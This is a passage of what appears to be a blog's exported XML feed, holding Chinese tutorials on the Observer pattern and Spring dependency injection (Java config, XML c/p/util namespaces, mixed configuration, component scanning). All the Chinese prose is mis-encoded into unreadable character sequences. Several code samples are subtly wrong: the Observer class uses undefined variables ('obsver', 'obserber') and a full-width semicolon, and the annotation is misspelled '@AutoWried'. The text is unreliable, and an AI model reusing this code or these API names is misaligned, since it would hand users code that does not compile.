ÑÊàêÂäüÔºåÈúÄË¶ÅÁªèËøáÂæàÂ§öÂéÜÁªÉ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÁîüÊ¥ª </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËÆæËÆ°Ê®°Âºè‰πãÁ¶Ö-ËßÇÂØüËÄÖÊ®°Âºè</title>
      <link href="/2018/10/25/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/10/25/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>ËßÇÂØüËÄÖÊ®°ÂºèÔºàObserver PatternÔºâ **‰πüÂè´ÂÅö</strong> ÂèëÂ∏ÉËÆ¢ÈòÖÊ®°Âºè **<br>(Publish/subscribe),ÂÆÉÊòØÂú®‰∏Ä‰∏™È°πÁõÆ‰∏≠ÁªèÂ∏∏‰ΩøÁî®ÁöÑÊ®°ÂºèÔºåÂÆö‰πâÂ¶Ç‰∏ãÔºö<br><em>Define a one-to-mang dependency between objects so that when one object<br>changes state,all its dependents are notified and updated automatically</em><br>ÔºàÂÆö‰πâÂØπË±°Èó¥‰∏ÄÁßç‰∏ÄÂØπÂ§öÁöÑ‰æùËµñÂÖ≥Á≥ªÔºå‰ΩøÂæóÊØèÂΩì‰∏Ä‰∏™ÂØπË±°ÊîπÂèòÁä∂ÊÄÅÔºåÂàôÊâÄÊúâ‰æùËµñ‰∫éÂÆÉÁöÑÂØπË±°ÈÉΩ‰ºöÂæóÂà∞ÈÄöÁü•Âπ∂Ë¢´Ëá™Âä®Êõ¥Êñ∞„ÄÇÔºâ</p><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373870.76685836943.png" alt="ËßÇÂØüËÄÖÈÄöÁî®Á±ªÂõæ"><br><strong>SubjectÔºöË¢´ËßÇÂØüËÄÖ</strong></p><blockquote><p>ÂÆö‰πâË¢´ËßÇÂØüËÄÖÂøÖÈ°ªÂÆûÁé∞ÁöÑËÅåË¥£ÔºåÂÆÉÂøÖÈ°ªËÉΩÂ§üÂä®ÊÄÅÊ∑ªÂä†„ÄÅÂà†Èô§ËßÇÂØüËÄÖ„ÄÇÂÆÉ‰∏ÄËà¨<br>ÊòØÊäΩË±°Á±ªÊàñËÄÖÂÆûÁé∞Á±ªÔºå‰ªÖ‰ªÖÂÆåÊàê‰Ωú‰∏∫Ë¢´ËßÇÂØüËÄÖÂøÖÈ°ªÂÆûÁé∞ÁöÑËÅåË¥£ÔºöÁÆ°ÁêÜËßÇÂØüËÄÖÂπ∂ÈÄöÁü•ËßÇÂØüËÄÖÔºànotifyObserversÔºâ</p></blockquote><p><strong>ObserverËßÇÂØüËÄÖ</strong></p><blockquote><p>ËßÇÂØüËÄÖÊî∂Âà∞‰ø°ÊÅØÂêéÔºåÂç≥ËøõË°åupdateÊìç‰ΩúÔºåÂØπÊé•Êî∂ÁöÑ‰ø°ÊÅØËøõË°åÂ§ÑÁêÜ<br> ËßÇÂØüËÄÖÊòØË¢´Ë¢´ËßÇÂØüËÄÖÁÆ°ÁêÜÁöÑ</p></blockquote><p><strong>ConcreteSubjectÂÖ∑‰ΩìÁöÑË¢´ËßÇÂØüËÄÖ</strong></p><blockquote><p>ÂÆö‰πâË¢´ËßÇÂØüËÄÖËá™Â∑±ÁöÑ‰∏öÂä°ÈÄªËæëÔºåÂêåÊó∂ÂÆö‰πâÂØπÂì™‰∫õÊó∂Èó¥ËøõË°åÈÄöÁü•„ÄÇ</p></blockquote><p><strong>ConcreteObserverÂÖ∑‰ΩìÁöÑËßÇÂØüËÄÖ</strong></p><blockquote><p>ÊØè‰∏™ËßÇÂØüËÄÖÂú®Êé•Êî∂Âà∞Ê∂àÊÅØÂêéÂ§ÑÁêÜÂèçÂ∫îÊòØ‰∏çÂêåÔºåÂêÑ‰∏™ËßÇÂØüËÄÖÊúâËá™Â∑±ÁöÑÂ§ÑÁêÜÈÄªËæë„ÄÇ</p></blockquote><h2 id="Ë¢´ËßÇÂØüËÄÖÊäΩË±°Êé•Âè£"><a href="#Ë¢´ËßÇÂØüËÄÖÊäΩË±°Êé•Âè£" class="headerlink" title="Ë¢´ËßÇÂØüËÄÖÊäΩË±°Êé•Âè£"></a>Ë¢´ËßÇÂØüËÄÖÊäΩË±°Êé•Âè£</h2><pre><code>public interface Observable {    //Ê∑ªÂä†‰∏Ä‰∏™ËßÇÂØüËÄÖ    public void addObserver(Observer observer);    //Âà†Èô§‰∏Ä‰∏™ËßÇÂØüËÄÖ    public void deleteObserver(Observer observer);    //ÈÄöÁü•ÊâÄÊúâËßÇÂØüËÄÖ    public void notifyObservers(String context);}</code></pre><p>ÂÖ∑‰ΩìÂÆûÁé∞Á±ª</p><pre><code>public class Subject implements Observable{    //ÂÆö‰πâ‰∏Ä‰∏™ËßÇÂØüËÄÖÊï∞ÁªÑ    private Vector&lt;Observer&gt; obsverVector = new Vector&lt;Observer&gt;();    //Ê∑ªÂä†‰∏Ä‰∏™ËßÇÂØüËÄÖ    public void addObserver(Observer observer){        obsver.add(observer)Ôºõ    }    //Âà†Èô§‰∏Ä‰∏™ËßÇÂØüËÄÖ    public void deleteObserver(Observer observer){        obsverVector.remove(obserber);    }    //ÈÄöÁü•ÊâÄÊúâËßÇÂØüËÄÖ    public void notifyObservers(String context){        for(Observer o : obsverVector){            o.update(context);        }    }    //‰∏öÂä°ÈÄªËæëÔºådosomethingÊó∂ÈÄöÁü•ÊâÄÊúâÂú®Êï∞ÁªÑ‰∏≠ÁöÑËßÇÂØüËÄÖ    public void dosomething(){    /**    dosth    */    notifyObservers(&quot;dosth&quot;);    }}</code></pre><h2 id="ËßÇÂØüËÄÖÊé•Âè£"><a href="#ËßÇÂØüËÄÖÊé•Âè£" class="headerlink" title="ËßÇÂØüËÄÖÊé•Âè£"></a>ËßÇÂØüËÄÖÊé•Âè£</h2><pre><code>public interface Observer {    //Ê†πÊçÆË¢´ËßÇÂØüËÄÖÊé®ÈÄÅÁöÑ‰ø°ÊÅØÔºåËßÇÂØüËÄÖËøõË°åÊõ¥Êñ∞‰ø°ÊÅØ    public void update(String context);}</code></pre><h2 id="ÂÖ∑‰ΩìÁöÑclient‰∏≠"><a href="#ÂÖ∑‰ΩìÁöÑclient‰∏≠" class="headerlink" title="ÂÖ∑‰ΩìÁöÑclient‰∏≠"></a>ÂÖ∑‰ΩìÁöÑclient‰∏≠</h2><pre><code>ËØ¥‰∏ãÊÄùË∑ØÂÖàÂª∫Á´ãsubjectÂÆû‰æãÁÑ∂ÂêéÂª∫Á´ã‰∏çÂêåÁöÑËßÇÂØüËÄÖÂÆû‰æãsubjectÈáåÈù¢Ê∑ªÂä†‰∏çÂêåÁöÑËßÇÂØüËÄÖÂÆû‰æãÔºàÂΩìÁÑ∂‰πüÂèØ‰ª•Âà†Èô§ÔºâÂú®subjectÊõ¥Êñ∞‰∫ã‰ª∂ÁöÑÊó∂ÂÄôÔºàÂèØ‰ª•ÈÄöÁü•ËßÇÂØüËÄÖÔºâ</code></pre><p><em>‰ºòÁÇπ</em></p><ol><li>ËßÇÂØüËÄÖÂíåË¢´ËßÇÂØüËÄÖ‰πãÈó¥ÊòØÊäΩË±°ËÄ¶Âêà(Â¢ûÂä†ËßÇÂØüËÄÖËøòÊòØË¢´ËßÇÂØüËÄÖÈÉΩÈùûÂ∏∏ÂÆπÊòìÊâ©Â±ï) </li><li>Âª∫Á´ã‰∏ÄÂ•óËß¶ÂèëÊú∫Âà∂ÔºàË¢´ËßÇÂØüËÄÖÊîπÂèòÔºåËß¶ÂèëÂØºËá¥ËßÇÂØüËÄÖÂèëÁîüÂèòÂåñÔºâ </li></ol><p><em>Áº∫ÁÇπ</em></p><ol><li>ËßÇÂØüËÄÖÊ®°ÂºèÈúÄË¶ÅËÄÉËôëÂºÄÂèëÊïàÁéáÂíåËøêË°åÊïàÁéáÔºå‰∏Ä‰∏™Ë¢´ËßÇÂØüËÄÖÔºåÂ§ö‰∏™ËßÇÂØüËÄÖ„ÄÇÂºÄÂèëÂíåË∞ÉËØïÊØîËæÉÂ§çÊùÇÔºåËÄå‰∏îjava‰∏≠Ê∂àÊÅØÈÄöÁü•ÊòØÈ°∫Â∫èÊâßË°åÔºå‰∏Ä‰∏™ËßÇÂØüËÄÖÂç°Â£≥ÊàñËÄÖÊåÇ‰∫ÜÔºå‰ºöÂΩ±ÂìçÊï¥‰ΩìÁöÑÊâßË°åÊïàÁéá„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºå‰∏ÄËà¨ËÄÉËôëÈááÁî®ÂºÇÊ≠•ÁöÑÊñπÂºè„ÄÇ </li></ol><p>ÂºÇÊ≠•Â§ÑÁêÜÈóÆÈ¢ò<br>ÂºÇÊ≠•Â§ÑÁêÜÂ∞±Ë¶ÅËÄÉËôëÁ∫øÁ®ãÂÆâÂÖ®ÂíåÈòüÂàóÁöÑÈóÆÈ¢òÔºåËøòÊòØÁúã‰∏ÄÁúãMessage Queue,‰ºöÊúâÊõ¥Ê∑±ÁöÑ‰∫ÜËß£„ÄÇÔºà‰ΩúËÄÖË°®Á§∫ÔºöÊ≤°ÁúãËøáÔºå‰ª•ÂêéÂÜçÁúãÔºâ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ËÆæËÆ°Ê®°Âºè‰πãÁ¶Ö </tag>
            
            <tag> ËßÇÂØüËÄÖÊ®°Âºè </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring‰æùËµñÊ≥®ÂÖ•Ôºà‰∫åÔºâ-javaÊ≥®ÂÖ•ÔºåxmlÊ≥®ÂÖ•ÔºåÊ∑∑ÂêàÊ≥®ÂÖ•</title>
      <link href="/2018/10/22/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-java%E6%B3%A8%E5%85%A5%EF%BC%8Cxml%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%B7%B7%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/10/22/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-java%E6%B3%A8%E5%85%A5%EF%BC%8Cxml%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%B7%B7%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><strong>javaÊ≥®ÂÖ•</strong></p><pre><code>@Configurationpublic class CDPlayerConfig {    @Bean    public CompactDisc compactDisc(){        return new SgtPeppers();    }    @Bean    public CDPlayer cdPlayer(CompactDisc cd){        return new CDPlayer(cd);    }}</code></pre><p>Âú®ÊµãËØïÁ±ª‰∏≠</p><pre><code>@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes = CDPlayerConfig.class)//Ê≠§Â§ÑÁî®ËøôÊ†∑ÁöÑÔºåÂΩìÁÑ∂ÔºåclassesÊòØÂèØ‰ª•ÂÜôÂ§ö‰∏™public class CDPlsyerTest {    @Autowired    private MediaPlayer player;    @Test    public void play(){        player.play();    }}</code></pre><p><strong>xmlÊ≥®ÂÖ•</strong><br>È¶ñÂÖà‰∫ÜËß£Ôºö<br><em>cÂëΩÂêçÁ©∫Èó¥</em> ÁÆÄÂåñ <em>ÊûÑÈÄ†Âô®</em> ÁöÑÂ±ûÊÄßËµãÂÄº<br><em>pÂëΩÂêçÁ©∫Èó¥</em> ÁÆÄÂåñ <em>setÊñπÊ≥ï</em> ÁöÑÂ±ûÊÄßËµãÂÄº</p><p>1.ÁÆÄÂçïÁâàÔºö<br>Á¨¨‰∏ÄÁßçÔºöÊûÑÈÄ†Âô®Ê≥®ÂÖ•</p><pre><code>&lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.collections.BlankDisc&quot;&gt;    &lt;constructor-arg value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot;/&gt;    &lt;constructor-arg value=&quot;The Beatles&quot;/&gt;    &lt;constructor-arg&gt;        &lt;list&gt;            &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt;            &lt;value&gt;With a Little Help from My Friend&lt;/value&gt;            &lt;value&gt;Lucy in the sky with Diamonds&lt;/value&gt;            &lt;value&gt;Getting Better&lt;/value&gt;            &lt;value&gt;Fixing a Hole&lt;/value&gt;            &lt;value&gt;She&apos;s leaving Home&lt;/value&gt;        &lt;/list&gt;    &lt;/constructor-arg&gt;&lt;/bean&gt;&lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.CDPlayer&quot;&gt;    &lt;constructor-arg ref=&quot;compactDisc&quot;/&gt;//refÊòØÂºïÁî®&lt;/bean&gt;</code></pre><p>Á¨¨‰∫åÁßçÔºösetÊñπÊ≥ïÊ≥®ÂÖ•</p><pre><code>&lt;bean id=&quot;compactDisc&quot;       class=&quot;soundsystem.properties.BlankDisc&quot;&gt;   &lt;property name=&quot;title&quot; value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot; /&gt;   &lt;property name=&quot;artist&quot; value=&quot;The Beatles&quot; /&gt;   &lt;property name=&quot;tracks&quot;&gt;     &lt;list&gt;       &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt;       &lt;value&gt;With a Little Help from My Friends&lt;/value&gt;       &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt;       &lt;value&gt;Getting Better&lt;/value&gt;       &lt;value&gt;Fixing a Hole&lt;/value&gt;       &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt;       &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt;       &lt;value&gt;Within You Without You&lt;/value&gt;       &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt;       &lt;value&gt;Lovely Rita&lt;/value&gt;       &lt;value&gt;Good Morning Good Morning&lt;/value&gt;       &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt;       &lt;value&gt;A Day in the Life&lt;/value&gt;     &lt;/list&gt;   &lt;/property&gt; &lt;/bean&gt;</code></pre><p><strong>2.ÁÆÄÂåñÁâàÔºö</strong><br><em>ÊûÑÈÄ†Âô®cÂëΩÂêçÁ©∫Èó¥</em></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;cd&quot; class=&quot;com.husky.spring.BlankDisc&quot;          c:_0=&quot;Sgt. pepper&apos;s lonely Hearts Club band&quot;        c:_1=&quot;The Beatles&quot;/&gt;    &lt;bean id=&quot;cdplayer&quot; class=&quot;com.husky.spring.CDPlayer&quot;          c:cd-ref=&quot;cd&quot;/&gt;&lt;/beans&gt;</code></pre><p>ËÆ∞ÂæóÂú®beansÈáåÈù¢ÂØºÂÖ• xmlns:c=‚Äú <a href="http://www.springframework.org/schema/c" target="_blank" rel="noopener"> http://www.springframework.org/schema/c</a> ‚Äù<br><em>setÊñπÊ≥ïpÂëΩÂêçÁ©∫Èó¥</em></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;compactDisc&quot;          class=&quot;com.husky.spring.properties.BlankDisc&quot;          p:title=&quot;Sgt. pepper&apos;s Lonely Hearts Club Band&quot;          p:artist=&quot;The Beatles&quot;&gt;        &lt;property name=&quot;tracks&quot;&gt;            &lt;list&gt;                &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt;                &lt;value&gt;With a Little Help from My Friends&lt;/value&gt;                &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt;                &lt;value&gt;Getting Better&lt;/value&gt;                &lt;value&gt;Fixing a Hole&lt;/value&gt;                &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt;                &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt;                &lt;value&gt;Within You Without You&lt;/value&gt;                &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt;                &lt;value&gt;Lovely Rita&lt;/value&gt;                &lt;value&gt;Good Morning Good Morning&lt;/value&gt;                &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt;                &lt;value&gt;A Day in the Life&lt;/value&gt;            &lt;/list&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;bean id=&quot;cdPlayer&quot;          class=&quot;com.husky.spring.properties.CDPlayer&quot;          p:compactDisc-ref=&quot;compactDisc&quot;/&gt;&lt;/beans&gt;</code></pre><p>ËÆ∞ÂæóÂØºÂÖ•xmlns:p=‚Äú <a href="http://www.springframework.org/schema/p" target="_blank" rel="noopener"> http://www.springframework.org/schema/p</a> ‚Äù<br><em>ÈõÜÂêàÔºöutilÂëΩÂêçÁ©∫Èó¥</em> _<strong>springÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠utilÂëΩÂêçÁ©∫Èó¥Á±ª‰ºº‰∫éjava.utilÂåÖÁ±ªÂØπÂ∫îÔºåutilÂëΩÂêçÁ©∫Èó¥Êèê‰æõ‰∫ÜÈõÜÂêàÁõ∏ÂÖ≥ÁöÑÈÖçÁΩÆ</strong> _</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;       xmlns:util=&quot;http://www.springframework.org/schema/util&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/util    http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt;    &lt;bean id=&quot;compactDisc&quot;          class=&quot;com.husky.spring.properties.BlankDisc&quot;          p:title=&quot;sgt. Pepper&apos;s Lonely Hearts Club Band&quot;          p:artist=&quot;The Peppers&quot;          p:tracks-ref=&quot;trackList&quot;/&gt;    &lt;util:list id=&quot;trackList&quot;&gt;        &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt;        &lt;value&gt;With a Little Help from My Friends&lt;/value&gt;        &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt;        &lt;value&gt;Getting Better&lt;/value&gt;        &lt;value&gt;Fixing a Hole&lt;/value&gt;        &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt;        &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt;        &lt;value&gt;Within You Without You&lt;/value&gt;        &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt;        &lt;value&gt;Lovely Rita&lt;/value&gt;        &lt;value&gt;Good Morning Good Morning&lt;/value&gt;        &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt;        &lt;value&gt;A Day in the Life&lt;/value&gt;    &lt;/util:list&gt;    &lt;bean id=&quot;cdPlayer&quot;          class=&quot;com.husky.spring.properties.CDPlayer&quot;          p:compactDisc-ref=&quot;compactDisc&quot;/&gt;&lt;/beans&gt;</code></pre><p><strong>Ê∑∑ÂêàÊ≥®ÂÖ•</strong><br><em>1.Âú®xml‰∏≠ÂØºÂÖ•javaconfig</em></p><pre><code>@Configurationpublic class CDPlayerConfig {    @Bean    public CDPlayer cdPlayer(CompactDisc compactDisc){        return new CDPlayer(compactDisc);    }}&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean class=&quot;com.husky.spring.CDConfig&quot;/&gt;    &lt;bean id=&quot;cdPlayer&quot;          class=&quot;com.husky.spring.CDPlayer&quot;          c:cd-ref=&quot;compactDisc&quot;/&gt;&lt;/beans&gt;</code></pre><p><strong>‰πüÂ∞±ÊòØÂú®xml‰∏≠Áõ¥Êé•Â∞ÜËøô‰∏™javaconfigÁõ¥Êé•Ê≥®ÂÜåÊàêbean</strong><br><em>2.Âú®java‰∏≠Ê≥®ÂÖ•xmlconfig</em><br>xmlconfig</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;compactDisc&quot;          class=&quot;com.husky.spring.BlankDisc&quot;          c:_0=&quot;Sgt. perpper&apos;s Lonely Hearts Club band&quot;          c:_1=&quot;The beatles&quot;&gt;    &lt;/bean&gt;&lt;/beans&gt;package com.husky.spring;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * @author husky * @date 2018/10/22 15:25 */@Configurationpublic class CDConfig {    @Bean    public CompactDisc compactDisc(){        return new SgtPeppers();    }}@Configuration@Import(CDPlayerConfig.class)@ImportResource(locations = {&quot;classpath:cd-config.xml&quot;})public class SoundSystemConfig {}</code></pre><p><strong>ÈÄöËøáimportÊù•ÂØºÂÖ•ËøõÊù•</strong></p><p>ÂÖ∑‰ΩìÊ∫êÁ†Å <a href="https://github.com/pompeii666/learnspring/tree/master/husky-javaConfig" target="_blank" rel="noopener"> javaconfig</a><br>[ xmlconfig ](<a href="https://github.com/pompeii666/learnspring/tree/master/husky-" target="_blank" rel="noopener">https://github.com/pompeii666/learnspring/tree/master/husky-</a><br>xmlconfig)<br>[ mixedconfig ](<a href="https://github.com/pompeii666/learnspring/tree/master/husky-" target="_blank" rel="noopener">https://github.com/pompeii666/learnspring/tree/master/husky-</a><br>mixedconfig)</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring‰æùËµñÊ≥®ÂÖ•Ôºà1Ôºâ-Ëá™Âä®Ê≥®ÂÖ•</title>
      <link href="/2018/10/17/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/10/17/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>Âú®ÈúÄË¶ÅÊ∑ªÂä†Ëá™Âä®Ê≥®ÂÖ•ÁöÑÁ±ªÂä†ÂÖ•Ê≥®Ëß£<br>@Component<br>Âú®Á±ª‰∏≠ÔºåÂ¶ÇÊûúÈúÄË¶ÅÊ≥®ÂÖ•Âà´ÁöÑÁ±ªÔºåËøô‰∏™Êó∂ÂÄôÂ£∞ÊòéÂà´ÁöÑÁ±ªÔºåÁÑ∂ÂêéÊ∑ªÂä†@AutoWried<br>ÂÖ∑‰Ωì‰æãÂ≠ê</p><pre><code>@Componentpublic class CDPlayer implements MediaPlayer {    @AutoWried    private CompactDisc cd;    @Override    public void play() {        cd.play();    }}</code></pre><p><strong>Á≥ªÁªüÂú®Êâ´ÊèèÊó∂ÔºåÂèëÁé∞@ComponentÊ≥®Ëß£‰ºöÂ∞ÜCDPlayerÊîæÂÖ•Â∫îÁî®‰∏ä‰∏ãÊñáÔºåËÄåÂú®Êâ´ÊèèÂà∞@AutoWriedÊó∂Ôºå‰ºöÂ∞ÜÂ∫îÁî®‰∏ä‰∏ãÊñá‰∏≠ÁöÑComPactDiscÊ≥®ÂÖ•Âà∞ÈáåÈù¢</strong></p><p>*<em>springÂΩì‰∏≠ÈÖçÁΩÆÂàÜ‰∏∫ÔºöjavaConfigÂíåxml<br>ËÄåÂú®javaConfig *</em></p><pre><code>@Configuration@ComponentScanpublic class CDPlayerConfig {}</code></pre><p>Ê≠§Â§Ñ‰ΩøÁî®@CompontScanÊ≥®Ëß£Ôºå‰ºöÂéªÂØªÊâæÂΩìÂâçCDPlayerÊâÄÂú®‰ΩçÁΩÆÁöÑÂåÖÈáåÈù¢ÁöÑÂêÑ‰∏™Á±ªÔºåÂπ∂ËøõË°åÊ≥®Ëß£Êâ´ÊèèÔºåÂΩìÁÑ∂CDPlayerConfig‰πüË¢´Êâ´ÊèèÂà∞‰∫ÜÔºåÂõ†‰∏∫ÂÆÉ‰ΩøÁî®‰∫Ü@ConfigurationÊ≥®Ëß£„ÄÇ„ÄÇÂΩìÁÑ∂@CompontScan‰πüÂèØ‰ª•ËÆæÁΩÆÊâ´ÊèèÂÖ∑‰ΩìÁöÑÂåÖÔºåÂèØ‰ª•Ê≥®Ëß£ÈáåÈù¢Ê∑ªÂä†ÈÖçÁΩÆÔºàÂÖ∑‰ΩìÈÅáÂà∞ÂÜçËØ¥Ôºâ</p><p><strong>xmlÈÖçÁΩÆ</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;context:component-scan base-package=&quot;com.husky.spring&quot;/&gt;&lt;/beans&gt;</code></pre><p>ÂÖ∑‰ΩìÊµãËØïÁöÑÊó∂ÂÄôÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™Ê≥®Ëß£<br><em>@ContextConfiguration(classes=CDPlayerConfig.class)</em><br>ÊàñËÄÖ<em>@ContextConfiguration(locations = ‚Äúclasspath:spring/soundsystem.xml‚Äù)</em></p><pre><code>/** * @author husky * @date 2018/10/17 16:31 */@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(classes=CDPlayerConfig.class)public class CDPlayerJavaConfigTest {    @Rule    public final  StandardOutputStreamLog log = new StandardOutputStreamLog();    @Autowired    private MediaPlayer player;    @Autowired    private CompactDisc cd;    @Test    public void cdShouldNotBeNull(){        assertNotNull(cd);    }    @Test    public void play(){        player.play();        assertEquals(&quot;Playing Sgt . Pepper&apos;s Lonely Hearts Club Band by The Beatles\n&quot;,log.getLog());    }}</code></pre><p>ÂÖ∑‰ΩìautoconfigÂú® <a href="https://github.com/pompeii666/learnspring/tree/master/springbean" target="_blank" rel="noopener"> github</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring‰ªãÁªç</title>
      <link href="/2018/10/17/spring%E4%BB%8B%E7%BB%8D/"/>
      <url>/2018/10/17/spring%E4%BB%8B%E7%BB%8D/</url>
      
